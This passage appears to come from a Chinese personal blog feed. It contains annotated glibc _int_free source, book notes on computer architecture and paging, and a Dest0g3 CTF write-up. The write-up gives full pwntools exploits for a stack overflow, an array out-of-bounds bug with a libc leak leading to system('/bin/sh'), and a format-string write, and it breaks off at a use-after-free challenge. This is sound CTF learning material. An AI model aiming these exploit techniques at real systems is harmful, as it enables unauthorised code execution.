class="type">uintptr_t</span>) -size, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(misaligned_chunk(p), <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">        <span class="keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">       multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">    <span class="comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span></span><br><span class="line">    check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><h4 id="int-free-fastbin部分"><a href="#int-free-fastbin部分" class="headerlink" title="__int_free fastbin部分"></a>__int_free fastbin部分</h4><p>这部分主要进行了以下检查：</p><ul><li>double free的检查</li><li>size大小的检查,如果fastbinY的大小是0x70,此时size 0x70-0x7f（64bit）都是合法的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);    <span class="comment">//获取p的size</span></span><br><span class="line">  check_inuse_chunk(av, p);<span class="comment">//检查p的物理相邻的下一个堆块的inuse位是否置1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line">      <span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">          <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        &#123;.......&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对chunk的data块通过memset赋值，但是默认情况下是不进行操作    </span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//设置 malloc_state的flag</span></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取p对应大小的fastbinY的索引</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">//fb指向对应大小的fastbinY的地址</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// old为 对应大小的fastbinY的fd值，也就是第一个对块的地址</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">// Check that the top of the bin is not the record we are going to add</span></span><br><span class="line">         <span class="comment">//检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">          <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//获取 fastbin中对应的bin的第一项的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">          old_idx = fastbin_index(chunksize(old));</span><br><span class="line">          <span class="comment">//让  p 的fd指向 顶部的fastbin块</span></span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">//catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span></span><br><span class="line">    <span class="comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果size大于max_fast，其余部分size的chunk会先放入unsorted_bin，等下次遍历unsorted_bin时，再放入相应大小的bin中。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养chapter1</title>
      <link href="/2022/06/24/%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BBchapter1/"/>
      <url>/2022/06/24/%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BBchapter1/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>计算机的硬件最为核心的三部分是：CPU,内存和I&#x2F;O控制芯片</p></li><li><p>早期计算机由于需求不高，所以CPU和内存以及各种外设都是连接在一条总线上的，后来由于CPU的核心频率提升，导致内存已经无法跟上CPU的速度了，所以出现了包含南北桥的芯片，北桥处理高速设备和CPU，南桥处理低速设备。</p></li><li><p>计算机发展到一定程度后，摩尔定律就不再适用，那是因为在制造CPU方面已经达到了人类的物理极限，在频率上CPU短期内是没有提高空间了，基本都在4Ghz以下，所以人们采用了多核CPU来提高上线，也就是__SMP（多核多处理器）__。</p></li><li><p>这里引用一句话“计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决”。计算机中的每个层次都需要通信，既然通信那就必然要存在一个通信协议，我们一般将其称之为接口。</p></li><li><p>CPU的资源十分昂贵，那么我们要做的当然就是不能让CPU闲着，从多道程序到分时系统再到多任务系统，都是人们压榨CPU的方法的升级。</p></li><li><p>不同的计算机硬件是有可能不同的，如果程序员们，要针对不同计算机的硬件来进行编程，那么程序员的应该会成为稀缺物种吧，这是我们不希望看到的，所以针对不同的硬件，一般开发商都会为其生产的硬件提供驱动程序，操作系统的开发者为硬件生产的开发商提供了一些接口和框架，这样这个问题就迎刃而解了</p></li><li><p>内存不够怎么办？我们现在面临了三个问腿，程序运行地址空间不隔离，内存使用效率低，程序运行的地址不确定。这时候我们的内存分页机制就完美的解决了这一问题。通过分页，我们将物理内存和虚拟内存分成若干个4kb大小的页 ，同时通过MMU来实现虚拟内存和物理内存的映射。</p></li><li><p>线程部分，这部分理解的不太好，还需要再读读。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序员的自我修养 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3迎新赛wp及其复现</title>
      <link href="/2022/05/24/destdog/"/>
      <url>/2022/05/24/destdog/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>由于这段时间比较忙，本人并未做全部题目，只写了部分，后面的题目有时间会补上的</p><h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><p>一道arm栈溢出，存在后门：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28172</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please leave your name:&#x27;</span>)</span><br><span class="line">p.timeout = <span class="number">0.5</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>) + <span class="string">b&#x27;\x3c&#x27;</span></span><br><span class="line">p.send(pl1)</span><br><span class="line">p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>存在数组越界漏洞，覆盖栈上数字下标变量即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&quot;./ez_pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27674</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./ez_pwn&quot;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.slafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims    :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(ru(data)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(ru(data)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info_base = <span class="keyword">lambda</span> tag, base        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd</span>):</span><br><span class="line">gdb.attach(r,cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sign32</span>(<span class="params">vx</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> vx <span class="keyword">or</span> vx &lt; <span class="number">0x80000000</span>:</span><br><span class="line">        <span class="keyword">return</span> vx</span><br><span class="line">    <span class="keyword">return</span> vx - <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input the length of array:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-4294967297&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;134516928&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;134517768&#x27;</span>) </span><br><span class="line"><span class="comment"># dbg(&#x27;b *0x804933D&#x27;)</span></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;134529044&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(&#x27;b *0x804933D&#x27;)</span></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">addr = uu32(<span class="string">b&#x27;\xf7&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">sh = base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">sys = get_sign32(sys)</span><br><span class="line">sh = get_sign32(sh)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input the length of array:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-4294967297&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(sys)</span><br><span class="line"><span class="comment"># dbg(&#x27;b *0x804933D&#x27;)</span></span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(sys).encode())</span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;134517768&#x27;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;input num&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(sh).encode())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;input your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>bss段格式化字符串，这题出题人没给libc，卡了很久</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28742</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.slafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims    :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(ru(data)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(ru(data)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info_base = <span class="keyword">lambda</span> tag, base        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(base))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,base :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd</span>):</span><br><span class="line">gdb.attach(r,cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">se(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">se(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">se(<span class="string">b&quot;%12$p%10$p&quot;</span>)</span><br><span class="line">text_base = <span class="built_in">int</span>(rc(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x185</span> - <span class="number">0x1000</span></span><br><span class="line">leak(<span class="string">&quot;text_base&quot;</span>,text_base)</span><br><span class="line">stack = <span class="built_in">int</span>(rc(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">num = stack % <span class="number">0x10000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">pl1 = <span class="string">&quot;%&#123;num&#125;c%10$hn&quot;</span>.<span class="built_in">format</span>(num = num)</span><br><span class="line"></span><br><span class="line">se(pl1)</span><br><span class="line">target = text_base + <span class="number">0x4010</span></span><br><span class="line">num2 = target % <span class="number">0x10000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num2))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">pl2 = <span class="string">&quot;%&#123;num&#125;c%39$hn&quot;</span>.<span class="built_in">format</span>(num = num2)</span><br><span class="line">se(pl2)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">pl3 = <span class="string">&quot;%1314520c%12$n&quot;</span></span><br><span class="line"></span><br><span class="line">se(pl3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p>很明显的漏洞uaf,但版本是2.33，之前没做过这个版本的，所以搜索了一下相关知识，也是做出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 